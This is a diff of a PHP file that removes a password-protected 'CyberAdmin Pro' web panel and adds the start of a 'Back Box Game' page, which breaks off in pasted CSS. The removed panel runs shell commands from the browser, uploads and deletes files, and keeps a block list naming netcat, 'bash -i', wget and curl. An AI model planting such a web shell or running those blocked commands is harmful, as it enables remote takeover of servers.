@@ -1,1148 +1,374 @@
-<?php
-session_start();
-ob_start();
-
-// ================= ENHANCED CONFIGURATION =================
-$CONFIG = [
-    'password' => 'Shuju@123',           // CHANGE THIS
-    'username' => 'Shuju',          // CHANGE THIS
-    'session_timeout' => 3600,
-    'base_directory' => '/var/www/html',
-    'allowed_ips' => [],
-    'log_actions' => true,
-    'max_upload_size' => 100 * 1024 * 1024,
-    'allowed_commands' => ['ls', 'pwd', 'whoami', 'id', 'cat', 'tail', 'head', 'grep', 'find', 'ps', 'df', 'du', 'free', 'uname'],
-    'blocked_commands' => ['rm -rf', 'mkfs', 'dd', 'chmod 777', 'passwd', '> /dev', 'nc -l', 'bash -i', 'wget', 'curl', 'python', 'perl', 'nc', 'netcat', 'sh', 'zsh', 'ksh'],
-    'allowed_extensions' => ['txt', 'log', 'conf', 'json', 'xml', 'html', 'css', 'js', 'php', 'jpg', 'png', 'gif', 'pdf', 'zip', 'tar', 'gz'],
-    'max_file_download_size' => 50 * 1024 * 1024
-];
-// ==========================================================
-
-// Enhanced Security Functions
-function checkAuth() {
-    global $CONFIG;
-    
-    // IP Whitelist Check
-    if (!empty($CONFIG['allowed_ips']) && !in_array($_SERVER['REMOTE_ADDR'], $CONFIG['allowed_ips'])) {
-        logAction("BLOCKED_IP_ACCESS", $_SERVER['REMOTE_ADDR']);
-        return false;
-    }
-    
-    // Session Validation
-    if (isset($_SESSION['authenticated']) && $_SESSION['authenticated'] === true) {
-        // Session Timeout Check
-        if (time() - $_SESSION['login_time'] > $CONFIG['session_timeout']) {
-            logAction("SESSION_TIMEOUT", $_SESSION['username']);
-            session_destroy();
-            return false;
-        }
-        
-        // Regenerate Session ID periodically
-        if (time() - $_SESSION['login_time'] > 1800) { // 30 minutes
-            session_regenerate_id(true);
-            $_SESSION['login_time'] = time();
-        }
-        
-        $_SESSION['last_activity'] = time();
-        return true;
-    }
-    return false;
-}
-
-function logAction($action, $details = '') {
-    global $CONFIG;
-    if (!$CONFIG['log_actions']) return;
-    
-    $username = isset($_SESSION['username']) ? $_SESSION['username'] : 'UNAUTHENTICATED';
-    $log = date('Y-m-d H:i:s') . " | " . $_SERVER['REMOTE_ADDR'] . " | $username | $action | $details\n";
-    file_put_contents('admin_actions.log', $log, FILE_APPEND | LOCK_EX);
-}
-
-function sanitizeInput($input) {
-    return htmlspecialchars(strip_tags($input), ENT_QUOTES, 'UTF-8');
-}
-
-function isSafeCommand($command) {
-    global $CONFIG;
-    
-    // Check against blocked commands
-    foreach ($CONFIG['blocked_commands'] as $cmd) {
-        if (stripos($command, $cmd) !== false) {
-            logAction("BLOCKED_COMMAND", $command);
-            return false;
-        }
-    }
-    
-    // If using allowed commands list, verify command is in the list
-    if (!empty($CONFIG['allowed_commands'])) {
-        $baseCmd = explode(' ', $command)[0];
-        if (!in_array($baseCmd, $CONFIG['allowed_commands'])) {
-            logAction("UNAUTHORIZED_COMMAND", $command);
-            return false;
-        }
-    }
-    
-    return true;
-}
-
-function formatBytes($bytes, $precision = 2) {
-    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
-    $bytes = max($bytes, 0);
-    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
-    $pow = min($pow, count($units) - 1);
-    $bytes /= pow(1024, $pow);
-    return round($bytes, $precision) . ' ' . $units[$pow];
-}
-
-function getDirectoryContents($dir) {
-    $items = [];
-    if (!is_dir($dir)) return $items;
-    
-    $files = scandir($dir);
-    foreach ($files as $file) {
-        if ($file == '.' || $file == '..') continue;
-        
-        $fullPath = $dir . DIRECTORY_SEPARATOR . $file;
-        $items[] = [
-            'name' => $file,
-            'path' => $fullPath,
-            'is_dir' => is_dir($fullPath),
-            'size' => is_dir($fullPath) ? null : filesize($fullPath),
-            'perms' => substr(sprintf('%o', fileperms($fullPath)), -4),
-            'modified' => filemtime($fullPath)
-        ];
-    }
-    
-    return $items;
-}
-
-// Authentication
-if (!checkAuth()) {
-    if (isset($_POST['username']) && isset($_POST['password'])) {
-        if ($_POST['username'] === $CONFIG['username'] && $_POST['password'] === $CONFIG['password']) {
-            $_SESSION['authenticated'] = true;
-            $_SESSION['login_time'] = time();
-            $_SESSION['username'] = $_POST['username'];
-            $_SESSION['last_activity'] = time();
-            logAction("LOGIN_SUCCESS", $_POST['username']);
-            header('Location: ' . $_SERVER['PHP_SELF']);
-            exit;
-        } else {
-            logAction("LOGIN_FAILED", $_POST['username']);
-            $error = "Invalid credentials!";
-        }
-    }
-    ?>
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <title>Secure Admin Login</title>
-        <style>
-            body { 
-                font-family: 'Segoe UI', Arial, sans-serif; 
-                background: linear-gradient(135deg, #1a1a1a 0%, #2d2d2d 100%); 
-                color: white; 
-                margin: 0; 
-                padding: 20px; 
-                display: flex; 
-                justify-content: center; 
-                align-items: center; 
-                min-height: 100vh; 
-            }
-            .login-box { 
-                background: rgba(45, 45, 45, 0.9); 
-                padding: 40px; 
-                border-radius: 15px; 
-                box-shadow: 0 10px 30px rgba(0,0,0,0.5); 
-                width: 100%; 
-                max-width: 400px; 
-                backdrop-filter: blur(10px);
-            }
-            .logo { 
-                text-align: center; 
-                margin-bottom: 30px; 
-            }
-            .logo img {
-                max-width: 180px;
-                margin-bottom: 15px;
-            }
-            .logo h1 { 
-                color: #00ff88; 
-                margin: 10px 0; 
-                font-size: 1.5rem;
-            }
-            .form-group { 
-                margin-bottom: 20px; 
-            }
-            input[type="text"], input[type="password"] { 
-                width: 100%; 
-                padding: 12px 15px; 
-                background: rgba(26, 26, 26, 0.8); 
-                border: 1px solid #444; 
-                color: white; 
-                border-radius: 8px; 
-                font-size: 1rem;
-                transition: all 0.3s;
-            }
-            input[type="text"]:focus, input[type="password"]:focus {
-                border-color: #00ff88;
-                outline: none;
-                box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
-            }
-            button { 
-                width: 100%; 
-                padding: 12px; 
-                background: #00ff88; 
-                color: black; 
-                border: none; 
-                border-radius: 8px; 
-                cursor: pointer; 
-                font-weight: bold; 
-                font-size: 1rem;
-                transition: all 0.3s;
-            }
-            button:hover {
-                background: #00cc6a;
-                transform: translateY(-2px);
-                box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
-            }
-            .error { 
-                background: rgba(255, 68, 68, 0.2); 
-                color: #ff6b6b; 
-                padding: 12px; 
-                border-radius: 8px; 
-                margin-bottom: 20px; 
-                text-align: center; 
-                border: 1px solid rgba(255, 68, 68, 0.3);
-            }
-            .footer {
-                text-align: center;
-                margin-top: 20px;
-                font-size: 0.8rem;
-                color: #888;
-            }
-        </style>
-    </head>
-    <body>
-        <div class="login-box">
-            <div class="logo">
-                <img src="https://shuju.to/assets/logo.png" alt="Admin Portal Logo">
-                <h1>ADMIN PORTAL</h1>
-            </div>
-            <?php if(isset($error)) echo "<div class='error'>$error</div>"; ?>
-            <form method="post">
-                <div class="form-group">
-                    <input type="text" name="username" placeholder="Username" required autocomplete="off">
-                </div>
-                <div class="form-group">
-                    <input type="password" name="password" placeholder="Password" required autocomplete="off">
-                </div>
-                <button type="submit">Login</button>
-            </form>
-            <div class="footer">
-                Secure Access Only
-            </div>
-        </div>
-    </body>
-    </html>
-    <?php
-    exit;
-}
-
-// Logout
-if (isset($_GET['logout'])) {
-    logAction("LOGOUT", $_SESSION['username']);
-    session_destroy();
-    header('Location: ' . $_SERVER['PHP_SELF']);
-    exit;
-}
-
-// Core Functions
-function executeCommand($command) {
-    if (!isSafeCommand($command)) {
-        return "Error: Command blocked for security reasons";
-    }
-    
-    $output = [];
-    $return_var = 0;
-    $descriptorspec = array(
-        0 => array("pipe", "r"),  // stdin
-        1 => array("pipe", "w"),  // stdout
-        2 => array("pipe", "w")   // stderr
-    );
-    
-    $process = proc_open($command, $descriptorspec, $pipes, getcwd());
-    
-    if (is_resource($process)) {
-        fclose($pipes[0]); // Close stdin
-        
-        $stdout = stream_get_contents($pipes[1]);
-        fclose($pipes[1]);
-        
-        $stderr = stream_get_contents($pipes[2]);
-        fclose($pipes[2]);
-        
-        $return_var = proc_close($process);
-        
-        if (!empty($stderr)) {
-            return "Error: " . $stderr;
-        }
-        
-        return $stdout;
-    }
-    
-    return "Error: Failed to execute command";
-}
-
-function getSystemInfo() {
-    global $CONFIG;
-    
-    // Memory usage
-    $memory_usage = memory_get_usage(true);
-    $memory_peak = memory_get_peak_usage(true);
-    
-    // Disk space
-    $disk_free = disk_free_space("/");
-    $disk_total = disk_total_space("/");
-    $disk_used = $disk_total - $disk_free;
-    
-    // CPU info (Linux only)
-    $cpu_info = 'N/A';
-    if (is_readable('/proc/cpuinfo')) {
-        $cpuinfo = file('/proc/cpuinfo');
-        $cpucores = 0;
-        foreach ($cpuinfo as $line) {
-            if (preg_match('/^processor/', $line)) $cpucores++;
-        }
-        $cpu_info = $cpucores . ' cores';
-    }
-    
-    // Load average (Linux only)
-    $load = 'N/A';
-    if (is_readable('/proc/loadavg')) {
-        $load = file_get_contents('/proc/loadavg');
-        $load = substr($load, 0, strpos($load, ' '));
-    }
-    
-    return [
-        'os' => php_uname(),
-        'server' => $_SERVER['SERVER_SOFTWARE'] ?? 'N/A',
-        'php_version' => phpversion(),
-        'memory_usage' => $memory_usage,
-        'memory_peak' => $memory_peak,
-        'disk_free' => $disk_free,
-        'disk_total' => $disk_total,
-        'disk_used' => $disk_used,
-        'cpu_info' => $cpu_info,
-        'load_average' => $load,
-        'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'N/A',
-        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'N/A',
-        'uptime' => @exec('uptime -p') ?: 'N/A'
-    ];
-}
-
-// Process Actions
-$output = '';
-$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : getcwd();
-if ($current_dir === false || strpos($current_dir, $CONFIG['base_directory']) !== 0) {
-    $current_dir = $CONFIG['base_directory'];
-}
-
-if ($_POST) {
-    if (isset($_POST['command'])) {
-        $command = sanitizeInput($_POST['command']);
-        $output = executeCommand($command);
-        logAction("COMMAND", $command);
-    }
-    elseif (isset($_POST['download'])) {
-        $file = realpath($_POST['file_path']);
-        if ($file && file_exists($file) && is_readable($file) && 
-            strpos($file, $CONFIG['base_directory']) === 0 &&
-            filesize($file) <= $CONFIG['max_file_download_size']) {
-            
-            $extension = pathinfo($file, PATHINFO_EXTENSION);
-            if (in_array($extension, $CONFIG['allowed_extensions'])) {
-                header('Content-Description: File Transfer');
-                header('Content-Type: application/octet-stream');
-                header('Content-Disposition: attachment; filename="'.basename($file).'"');
-                header('Content-Length: ' . filesize($file));
-                header('Cache-Control: must-revalidate');
-                header('Pragma: public');
-                readfile($file);
-                logAction("DOWNLOAD", $file);
-                exit;
-            } else {
-                $output = "Error: File type not allowed";
-            }
-        } else {
-            $output = "Error: File not accessible or too large";
-        }
-    }
-    elseif (isset($_POST['delete_file'])) {
-        $file = realpath($_POST['file_path']);
-        if ($file && file_exists($file) && is_writable($file) && 
-            strpos($file, $CONFIG['base_directory']) === 0 &&
-            $file != __FILE__) {
-            
-            if (is_dir($file)) {
-                if (rmdir($file)) {
-                    $output = "Directory deleted successfully";
-                    logAction("DELETE_DIR", $file);
-                } else {
-                    $output = "Error: Could not delete directory (may not be empty)";
-                }
-            } else {
-                if (unlink($file)) {
-                    $output = "File deleted successfully";
-                    logAction("DELETE_FILE", $file);
-                } else {
-                    $output = "Error: Could not delete file";
-                }
-            }
-        } else {
-            $output = "Error: File not accessible or protected";
-        }
-    }
-    elseif (isset($_POST['create_file'])) {
-        $filename = sanitizeInput($_POST['filename']);
-        $filepath = $current_dir . DIRECTORY_SEPARATOR . $filename;
-        
-        if (strpos(realpath($filepath), $CONFIG['base_directory']) === 0) {
-            if (!file_exists($filepath)) {
-                if (touch($filepath)) {
-                    $output = "File created successfully";
-                    logAction("CREATE_FILE", $filepath);
-                } else {
-                    $output = "Error: Could not create file";
-                }
-            } else {
-                $output = "Error: File already exists";
-            }
-        } else {
-            $output = "Error: Invalid file path";
-        }
-    }
-    elseif (isset($_POST['create_dir'])) {
-        $dirname = sanitizeInput($_POST['dirname']);
-        $dirpath = $current_dir . DIRECTORY_SEPARATOR . $dirname;
-        
-        if (strpos(realpath($dirpath), $CONFIG['base_directory']) === 0) {
-            if (!file_exists($dirpath)) {
-                if (mkdir($dirpath, 0755)) {
-                    $output = "Directory created successfully";
-                    logAction("CREATE_DIR", $dirpath);
-                } else {
-                    $output = "Error: Could not create directory";
-                }
-            } else {
-                $output = "Error: Directory already exists";
-            }
-        } else {
-            $output = "Error: Invalid directory path";
-        }
-    }
-}
-
-if (isset($_FILES['upload_file'])) {
-    $upload = $_FILES['upload_file'];
-    if ($upload['error'] === UPLOAD_ERR_OK) {
-        if ($upload['size'] <= $CONFIG['max_upload_size']) {
-            $target = $current_dir . '/' . basename($upload['name']);
-            if (move_uploaded_file($upload['tmp_name'], $target)) {
-                $output = "File uploaded successfully";
-                logAction("UPLOAD", $target);
-            } else {
-                $output = "Error: Upload failed";
-            }
-        } else {
-            $output = "Error: File too large";
-        }
-    } else {
-        $output = "Error: Upload error " . $upload['error'];
-    }
-}
-
-$system_info = getSystemInfo();
-$directory_contents = getDirectoryContents($current_dir);
+<?php 
+    session_start();
+    // php -r "echo password_hash('yourstrongpassword', PASSWORD_DEFAULT );"
+    // using above command create a new password hash for your password and
+    // replace here.
+    $PASSWD = '$2y$10$3u6QjaxRNWdJuxTnZxD3LOmUgUrhyVFUEF1EqnrakruGawKA19m1O'; 
 ?>
+
 <!DOCTYPE html>
-<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CyberAdmin Pro</title>
-    <style>
-        :root {
-            --primary: #00ff88;
-            --primary-dark: #00cc6a;
-            --dark: #0a0a0a;
-            --darker: #050505;
-            --light: #1a1a1a;
-            --lighter: #2a2a2a;
-            --text: #ffffff;
-            --text-muted: #aaaaaa;
-            --danger: #ff4444;
-            --warning: #ffaa00;
-        }
-        
-        * {
-            box-sizing: border-box;
-        }
-        
-        body { 
-            font-family: 'Segoe UI', Arial, sans-serif; 
-            background: var(--dark); 
-            color: var(--text); 
-            margin: 0; 
-            padding: 0; 
-            line-height: 1.6;
-        }
-        
-        .header { 
-            background: var(--darker); 
-            padding: 15px 0; 
-            border-bottom: 2px solid var(--primary);
-            box-shadow: 0 2px 10px rgba(0,0,0,0.3);
-        }
-        
-        .header-content { 
-            max-width: 1400px; 
-            margin: 0 auto; 
-            display: flex; 
-            justify-content: space-between;
-            align-items: center;
-            padding: 0 20px;
-        }
-        
-        .logo-container {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .logo-container img {
-            height: 40px;
-        }
-        
-        .logo-text {
-            font-size: 1.5rem;
-            font-weight: bold;
-            color: var(--primary);
-        }
-        
-        .user-info {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-        
-        .container { 
-            max-width: 1400px; 
-            margin: 20px auto; 
-            padding: 0 20px; 
-        }
-        
-        .tabs { 
-            display: flex; 
-            background: var(--light); 
-            border-radius: 8px 8px 0 0; 
-            overflow: hidden;
-        }
-        
-        .tab { 
-            padding: 15px 25px; 
-            background: none; 
-            border: none; 
-            color: var(--text-muted); 
-            cursor: pointer; 
-            transition: all 0.3s;
-            font-weight: 500;
-        }
-        
-        .tab:hover {
-            background: var(--lighter);
-            color: var(--text);
-        }
-        
-        .tab.active { 
-            background: var(--lighter); 
-            color: var(--primary); 
-            border-bottom: 2px solid var(--primary);
-        }
-        
-        .tab-content { 
-            display: none; 
-            background: var(--light); 
-            padding: 25px; 
-            border-radius: 0 0 8px 8px; 
-            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
-        }
-        
-        .tab-content.active { 
-            display: block; 
-        }
-        
-        .command-form { 
-            display: flex; 
-            gap: 10px; 
-            margin-bottom: 20px; 
-        }
-        
-        .command-input { 
-            flex: 1; 
-            padding: 12px 15px; 
-            background: var(--darker); 
-            border: 1px solid #333; 
-            color: white; 
-            border-radius: 6px;
-            font-family: 'Consolas', monospace;
-            font-size: 0.95rem;
-        }
-        
-        .command-input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 2px rgba(0, 255, 136, 0.2);
-        }
-        
-        .btn { 
-            background: var(--primary); 
-            color: black; 
-            border: none; 
-            padding: 12px 20px; 
-            cursor: pointer; 
-            font-weight: bold; 
-            border-radius: 6px;
-            transition: all 0.3s;
-            display: inline-flex;
-            align-items: center;
-            gap: 5px;
-        }
-        
-        .btn:hover {
-            background: var(--primary-dark);
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.3);
-        }
-        
-        .btn-danger {
-            background: var(--danger);
-            color: white;
-        }
-        
-        .btn-danger:hover {
-            background: #cc3333;
-        }
-        
-        .btn-warning {
-            background: var(--warning);
-            color: black;
-        }
-        
-        .output { 
-            background: var(--darker); 
-            padding: 15px; 
-            border-radius: 6px; 
-            font-family: 'Consolas', monospace; 
-            white-space: pre-wrap;
-            max-height: 500px;
-            overflow-y: auto;
-            border: 1px solid #333;
-        }
-        
-        .stats { 
-            display: grid; 
-            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); 
-            gap: 15px; 
-            margin-bottom: 25px; 
-        }
-        
-        .stat-card { 
-            background: var(--light); 
-            padding: 20px; 
-            border-radius: 8px; 
-            border-left: 4px solid var(--primary);
-            box-shadow: 0 3px 10px rgba(0,0,0,0.1);
-        }
-        
-        .stat-card h3 {
-            margin-top: 0;
-            color: var(--primary);
-            font-size: 1rem;
-            margin-bottom: 10px;
-        }
-        
-        .file-manager {
-            display: flex;
-            flex-direction: column;
-            gap: 20px;
-        }
-        
-        .file-actions {
-            display: flex;
-            gap: 10px;
-            flex-wrap: wrap;
-        }
-        
-        .breadcrumb {
-            display: flex;
-            align-items: center;
-            gap: 5px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-        }
-        
-        .breadcrumb a {
-            color: var(--primary);
-            text-decoration: none;
-        }
-        
-        .breadcrumb a:hover {
-            text-decoration: underline;
-        }
-        
-        .file-table {
-            width: 100%;
-            border-collapse: collapse;
-            background: var(--darker);
-            border-radius: 6px;
-            overflow: hidden;
-        }
-        
-        .file-table th, .file-table td {
-            padding: 12px 15px;
-            text-align: left;
-            border-bottom: 1px solid #333;
-        }
-        
-        .file-table th {
-            background: var(--lighter);
-            color: var(--primary);
-            font-weight: 600;
-        }
-        
-        .file-table tr:hover {
-            background: rgba(255,255,255,0.05);
-        }
-        
-        .file-icon {
-            margin-right: 8px;
-        }
-        
-        .file-actions-cell {
-            display: flex;
-            gap: 5px;
-        }
-        
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0,0,0,0.7);
-            z-index: 1000;
-            justify-content: center;
-            align-items: center;
-        }
-        
-        .modal-content {
-            background: var(--light);
-            padding: 25px;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 500px;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
-        }
-        
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: 20px;
-        }
-        
-        .modal-close {
-            background: none;
-            border: none;
-            color: var(--text);
-            font-size: 1.5rem;
-            cursor: pointer;
-        }
-        
-        .form-group {
-            margin-bottom: 15px;
-        }
-        
-        .form-group label {
-            display: block;
-            margin-bottom: 5px;
-            color: var(--text-muted);
-        }
-        
-        .form-control {
-            width: 100%;
-            padding: 10px 12px;
-            background: var(--darker);
-            border: 1px solid #333;
-            color: white;
-            border-radius: 6px;
-        }
-        
-        .form-control:focus {
-            outline: none;
-            border-color: var(--primary);
-        }
-        
-        .alert {
-            padding: 12px 15px;
-            border-radius: 6px;
-            margin-bottom: 20px;
-        }
-        
-        .alert-success {
-            background: rgba(0, 255, 136, 0.1);
-            border: 1px solid rgba(0, 255, 136, 0.3);
-            color: var(--primary);
-        }
-        
-        .alert-error {
-            background: rgba(255, 68, 68, 0.1);
-            border: 1px solid rgba(255, 68, 68, 0.3);
-            color: #ff6b6b;
-        }
-        
-        .quick-commands {
-            display: grid;
-            grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        
-        .quick-command {
-            background: var(--darker);
-            border: 1px solid #333;
-            color: var(--text);
-            padding: 10px;
-            border-radius: 6px;
-            cursor: pointer;
-            text-align: center;
-            transition: all 0.2s;
-        }
-        
-        .quick-command:hover {
-            background: var(--lighter);
-            border-color: var(--primary);
-        }
-        
-        @media (max-width: 768px) {
-            .header-content {
-                flex-direction: column;
-                gap: 10px;
-            }
-            
-            .tabs {
-                flex-wrap: wrap;
-            }
-            
-            .tab {
-                flex: 1;
-                min-width: 120px;
-                text-align: center;
-            }
-            
-            .command-form {
-                flex-direction: column;
-            }
-            
-            .file-table {
-                display: block;
-                overflow-x: auto;
-            }
-        }
-    </style>
+    <title>Back Box Game</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
 </head>
 <body>
-    <div class="header">
-        <div class="header-content">
-            <div class="logo-container">
-                <img src="https://shuju.to/assets/logo.png" alt="CyberAdmin Pro Logo">
-                <div class="logo-text">CyberAdmin Pro</div>
-            </div>
-            <div class="user-info">
-                Welcome, <strong><?php echo $_SESSION['username']; ?></strong> | 
-                <a href="?logout=1" style="color: var(--danger); text-decoration: none;">Logout</a>
-            </div>
-        </div>
-    </div>
 
-    <div class="container">
-        <div class="stats">
-            <div class="stat-card">
-                <h3>System Info</h3>
-                <div><?php echo $system_info['os']; ?></div>
-            </div>
-            <div class="stat-card">
-                <h3>PHP Version</h3>
-                <div><?php echo $system_info['php_version']; ?></div>
-            </div>
-            <div class="stat-card">
-                <h3>Memory Usage</h3>
-                <div><?php echo formatBytes($system_info['memory_usage']); ?> / <?php echo formatBytes($system_info['memory_peak']); ?> peak</div>
-            </div>
-            <div class="stat-card">
-                <h3>Disk Space</h3>
-                <div><?php echo formatBytes($system_info['disk_used']); ?> / <?php echo formatBytes($system_info['disk_total']); ?></div>
-            </div>
-            <div class="stat-card">
-                <h3>Server Load</h3>
-                <div><?php echo $system_info['load_average']; ?> (<?php echo $system_info['cpu_info']; ?>)</div>
-            </div>
-            <div class="stat-card">
-                <h3>Uptime</h3>
-                <div><?php echo $system_info['uptime']; ?></div>
-            </div>
-        </div>
+<!---
+*****************************
+            W3CSS
+*****************************
+-->
+<style>
+/* W3.CSS 4.13 June 2019 by Jan Egil and Borge Refsnes */
+html{box-sizing:border-box}*,*:before,*:after{box-sizing:inherit}
+/* Extract from normalize.css by Nicolas Gallagher and Jonathan Neal git.io/normalize */
+html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}
+article,aside,details,figcaption,figure,footer,header,main,menu,nav,section{display:block}summary{display:list-item}
+audio,canvas,progress,video{display:inline-block}progress{vertical-align:baseline}
+audio:not([controls]){display:none;height:0}[hidden],template{display:none}
+a{background-color:transparent}a:active,a:hover{outline-width:0}
+abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}
+b,strong{font-weight:bolder}dfn{font-style:italic}mark{background:#ff0;color:#000}
+small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}
+sub{bottom:-0.25em}sup{top:-0.5em}figure{margin:1em 40px}img{border-style:none}
+code,kbd,pre,samp{font-family:monospace,monospace;font-size:1em}hr{box-sizing:content-box;height:0;overflow:visible}
+button,input,select,textarea,optgroup{font:inherit;margin:0}optgroup{font-weight:bold}
+button,input{overflow:visible}button,select{text-transform:none}
+button,[type=button],[type=reset],[type=submit]{-webkit-appearance:button}
+button::-moz-focus-inner,[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner{border-style:none;padding:0}
+button:-moz-focusring,[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring{outline:1px dotted ButtonText}
+fieldset{border:1px solid #c0c0c0;margin:0 2px;padding:.35em .625em .75em}
+legend{color:inherit;display:table;max-width:100%;padding:0;white-space:normal}textarea{overflow:auto}
+[type=checkbox],[type=radio]{padding:0}
+[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}
+[type=search]{-webkit-appearance:textfield;outline-offset:-2px}
+[type=search]::-webkit-search-decoration{-webkit-appearance:none}
+::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}
+/* End extract */
+html,body{font-family:Verdana,sans-serif;font-size:15px;line-height:1.5}html{overflow-x:hidden}
+h1{font-size:36px}h2{font-size:30px}h3{font-size:24px}h4{font-size:20px}h5{font-size:18px}h6{font-size:16px}.w3-serif{font-family:serif}
+h1,h2,h3,h4,h5,h6{font-family:"Segoe UI",Arial,sans-serif;font-weight:400;margin:10px 0}.w3-wide{letter-spacing:4px}
+hr{border:0;border-top:1px solid #eee;margin:20px 0}
+.w3-image{max-width:100%;height:auto}img{vertical-align:middle}a{color:inherit}
+.w3-table,.w3-table-all{border-collapse:collapse;border-spacing:0;width:100%;display:table}.w3-table-all{border:1px solid #ccc}
+.w3-bordered tr,.w3-table-all tr{border-bottom:1px solid #ddd}.w3-striped tbody tr:nth-child(even){background-color:#f1f1f1}
+.w3-table-all tr:nth-child(odd){background-color:#fff}.w3-table-all tr:nth-child(even){background-color:#f1f1f1}
+.w3-hoverable tbody tr:hover,.w3-ul.w3-hoverable li:hover{background-color:#ccc}.w3-centered tr th,.w3-centered tr td{text-align:center}
+.w3-table td,.w3-table th,.w3-table-all td,.w3-table-all th{padding:8px 8px;display:table-cell;text-align:left;vertical-align:top}
+.w3-table th:first-child,.w3-table td:first-child,.w3-table-all th:first-child,.w3-table-all td:first-child{padding-left:16px}
+.w3-btn,.w3-button{border:none;display:inline-block;padding:8px 16px;vertical-align:middle;overflow:hidden;text-decoration:none;color:inherit;background-color:inherit;text-align:center;cursor:pointer;white-space:nowrap}
+.w3-btn:hover{box-shadow:0 8px 16px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19)}
+.w3-btn,.w3-button{-webkit-touch-callout:none;-webkit-user-select:none;-khtml-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}   
+.w3-disabled,.w3-btn:disabled,.w3-button:disabled{cursor:not-allowed;opacity:0.3}.w3-disabled *,:disabled *{pointer-events:none}
+.w3-btn.w3-disabled:hover,.w3-btn:disabled:hover{box-shadow:none}
+.w3-badge,.w3-tag{background-color:#000;color:#fff;display:inline-block;padding-left:8px;padding-right:8px;text-align:center}.w3-badge{border-radius:50%}
+.w3-ul{list-style-type:none;padding:0;margin:0}.w3-ul li{padding:8px 16px;border-bottom:1px solid #ddd}.w3-ul li:last-child{border-bottom:none}
+.w3-tooltip,.w3-display-container{position:relative}.w3-tooltip .w3-text{display:none}.w3-tooltip:hover .w3-text{display:inline-block}
+.w3-ripple:active{opacity:0.5}.w3-ripple{transition:opacity 0s}
+.w3-input{padding:8px;display:block;border:none;border-bottom:1px solid #ccc;width:100%}
+.w3-select{padding:9px 0;width:100%;border:none;border-bottom:1px solid #ccc}
+.w3-dropdown-click,.w3-dropdown-hover{position:relative;display:inline-block;cursor:pointer}
+.w3-dropdown-hover:hover .w3-dropdown-content{display:block}
+.w3-dropdown-hover:first-child,.w3-dropdown-click:hover{background-color:#ccc;color:#000}
+.w3-dropdown-hover:hover > .w3-button:first-child,.w3-dropdown-click:hover > .w3-button:first-child{background-color:#ccc;color:#000}
+.w3-dropdown-content{cursor:auto;color:#000;background-color:#fff;display:none;position:absolute;min-width:160px;margin:0;padding:0;z-index:1}
+.w3-check,.w3-radio{width:24px;height:24px;position:relative;top:6px}
+.w3-sidebar{height:100%;width:200px;background-color:#fff;position:fixed!important;z-index:1;overflow:auto}
+.w3-bar-block .w3-dropdown-hover,.w3-bar-block .w3-dropdown-click{width:100%}
+.w3-bar-block .w3-dropdown-hover .w3-dropdown-content,.w3-bar-block .w3-dropdown-click .w3-dropdown-content{min-width:100%}
+.w3-bar-block .w3-dropdown-hover .w3-button,.w3-bar-block .w3-dropdown-click .w3-button{width:100%;text-align:left;padding:8px 16px}
+.w3-main,#main{transition:margin-left .4s}
+.w3-modal{z-index:3;display:none;padding-top:100px;position:fixed;left:0;top:0;width:100%;height:100%;overflow:auto;background-color:rgb(0,0,0);background-color:rgba(0,0,0,0.4)}
+.w3-modal-content{margin:auto;background-color:#fff;position:relative;padding:0;outline:0;width:600px}
+.w3-bar{width:100%;overflow:hidden}.w3-center .w3-bar{display:inline-block;width:auto}
+.w3-bar .w3-bar-item{padding:8px 16px;float:left;width:auto;border:none;display:block;outline:0}
+.w3-bar .w3-dropdown-hover,.w3-bar .w3-dropdown-click{position:static;float:left}
+.w3-bar .w3-button{white-space:normal}
+.w3-bar-block .w3-bar-item{width:100%;display:block;padding:8px 16px;text-align:left;border:none;white-space:normal;float:none;outline:0}
+.w3-bar-block.w3-center .w3-bar-item{text-align:center}.w3-block{display:block;width:100%}
+.w3-responsive{display:block;overflow-x:auto}
+.w3-container:after,.w3-container:before,.w3-panel:after,.w3-panel:before,.w3-row:after,.w3-row:before,.w3-row-padding:after,.w3-row-padding:before,
+.w3-cell-row:before,.w3-cell-row:after,.w3-clear:after,.w3-clear:before,.w3-bar:before,.w3-bar:after{content:"";display:table;clear:both}
+.w3-col,.w3-half,.w3-third,.w3-twothird,.w3-threequarter,.w3-quarter{float:left;width:100%}
+.w3-col.s1{width:8.33333%}.w3-col.s2{width:16.66666%}.w3-col.s3{width:24.99999%}.w3-col.s4{width:33.33333%}
